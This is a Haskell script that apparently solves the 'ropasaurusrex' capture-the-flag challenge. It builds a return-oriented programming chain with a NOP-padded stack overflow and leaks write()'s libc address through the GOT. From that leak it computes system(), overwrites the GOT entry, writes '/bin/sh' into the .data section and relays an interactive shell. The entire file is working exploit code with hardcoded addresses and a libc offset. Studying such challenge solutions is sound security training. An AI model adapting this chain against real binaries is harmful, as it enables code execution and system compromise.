#!/usr/bin/env stack
-- stack --resolver=lts-3.11 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix --package=conduit-extra --package=conduit-combinators

-- This gives us an experience similar to @ghci@.  Raw values (1 and
-- 10 below) that implement the 'Num' type class will be defaulted to 'Int'
-- (specified with the @default@ command below).  Raw values (all strings)
-- that implement the 'IsString' typeclass will be defaulted to Text (also
-- specified with the @default@ command below).
--
-- Without this extension turned on, ghc will produce errors like this:
-- @
--  code.hs:27:25:
--      No instance for (Data.String.IsString a0)
--            arising from the literal ‘"-alF"’
-- @
{-# LANGUAGE ExtendedDefaultRules #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# OPTIONS_GHC -Wall #-}

-- Don't warn that things (like strings and numbers) are being defaulted to
-- certain types.  It's okay because this is just shell programming.
{-# OPTIONS_GHC -fno-warn-type-defaults #-}

import Control.Concurrent.Async (Concurrently(..))
import Data.Binary (encode, decode)
import qualified Data.ByteString.Lazy as BL
import Data.ByteString.Lazy (ByteString)
import Data.Conduit (($$), yield)
import Data.Conduit.Combinators (stdin, stdout)
import Data.Conduit.List as CL
import Data.Conduit.Process (streamingProcess, waitForStreamingProcess)
import Data.Maybe (fromJust)
import Data.Monoid ((<>))
import qualified Data.Text as T
import GHC.Word (Word32, Word8, byteSwap32)
import Numeric (showHex)
import System.IO (Handle, stderr)
import System.Process (shell)

-- Define the the types that should be defaulted to.  We can define one
-- type for string-like things, and one type for integer-like things.  It
-- doesn't matter what order they are in.
default (T.Text, Int)

nop :: Word8
nop = toEnum 0x90

-- | Pads a 'ByteString' with NOPs up to length 'Word32'.
padTo :: Word32 -> ByteString -> ByteString
padTo fullBufLength string = nopSled <> string
  where
    paddingLen :: Integer
    paddingLen = toInteger fullBufLength - toInteger (BL.length string)

    nopSled :: ByteString
    nopSled = BL.replicate (fromInteger paddingLen) nop

-- | Turns a 'Word32' into a memory address.
--
-- It swaps the byte order.
toAddr :: Word32 -> Word32
toAddr = byteSwap32

nops :: ByteString
nops = BL.replicate 140 nop

-- | Addr of 'read' in the plt.
readAddrPLT :: Word32
readAddrPLT = toAddr 0x804832c

-- | Addr of 'read' in the got.
readAddrGOT :: Word32
readAddrGOT = toAddr 0x804961c

writeAddrPLT :: Word32
writeAddrPLT = toAddr 0x804830c

writeAddressGOT :: Word32
writeAddressGOT = toAddr 0x8049614

-- | Addr of a @pop, pop, pop, ret@ sequence.
popPopPopRetAddr :: Word32
popPopPopRetAddr = toAddr 0x080484b6

-- | Offset of 'system' in Arch's libc.so.
systemOffset :: Word32
systemOffset = 0x0009d990

paddedExploit :: ByteString
paddedExploit = nops
    <> encode writeAddrPLT          -- Print out address of write() to stdout.
        <> encode popPopPopRetAddr
        <> encode (toAddr 1)
        <> encode writeAddressGOT
        <> encode (toAddr 4)
    <> encode readAddrPLT           -- Read in computed location of system()
                                    -- into write()'s GOT.
        <> encode popPopPopRetAddr
        <> encode (toAddr 0)
        <> encode writeAddressGOT
        <> encode (toAddr 4)
    <> encode readAddrPLT           -- Read in 8 character string to feed to
                                    -- system().  This will be something
                                    -- like "/bin/sh".
        <> encode popPopPopRetAddr
        <> encode (toAddr 0)
        <> encode (toAddr 0x8049620) -- This is the .data section.
                                     -- We could also use the .bss
                                     -- at 0x08049628.
        <> encode (toAddr 8)
    <> encode writeAddrPLT           -- This should be pointing to system().
        <> BL.replicate 4 nop
        <> encode (toAddr 0x8049620) -- Send system() the addr that we stored
                                     -- the "/bin/sh" string in.

main :: IO ()
main = do
    BL.hPutStr stderr "\n"
    BL.hPutStr stderr "---------------\n"
    BL.hPutStr stderr "-- Started. --\n"
    BL.hPutStr stderr "---------------\n\n"

    -- open the ropasaurauxrex binary
    (processStdin, processStdout, _ :: Handle, processHandle) <- streamingProcess $
        shell "./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"

    -- send the exploit to ropasaurusrex's stdin
    yield (BL.toStrict paddedExploit) $$ processStdin

    -- read the addr of write in libc from ropasaurusrex's stdout
    writeAddrRaw <- fromJust <$> (processStdout $$ CL.head)

    -- calculate the value of 'system' based on the value of 'write'
    let writeAddr = toAddr . decode $ BL.fromStrict writeAddrRaw
    let systemAddr = toAddr (writeAddr - systemOffset)

    putStrLn $ showHex writeAddr ""
    putStrLn $ showHex systemOffset ""
    putStrLn $ showHex (toAddr systemAddr) ""

    -- send the calculated address of 'system' to ropasaurusrex's stdin
    yield (BL.toStrict $ encode systemAddr) $$ processStdin

    -- send the @/bin/sh@ string to ropasaurusrex's stdin
    yield "/bin/sh\0" $$ processStdin

    -- make two conduits that feed breaker.hs's stdin to ropasaurusrex's
    -- stdin, and ropasaurusrex's stdout to breaker.hs's stdout.  This lets us
    -- easily control the shell that will spawn.
    -- let input = CB.sourceHandle stdin $$ processStdin
    let stdinToRopasaurusrexStdin = stdin $$ processStdin
        ropasaurusrexStdoutToStdout = processStdout $$ stdout

    -- run our input and output conduits concurrently
    exitCode <- runConcurrently $
                    Concurrently stdinToRopasaurusrexStdin *>
                    Concurrently ropasaurusrexStdoutToStdout *>
                    Concurrently (waitForStreamingProcess processHandle)

    putStrLn $ "exitCode: " <> show exitCode

    BL.hPutStr stderr "\n"
    BL.hPutStr stderr "---------------\n"
    BL.hPutStr stderr "-- Finished. --\n"
    BL.hPutStr stderr "---------------\n\n"

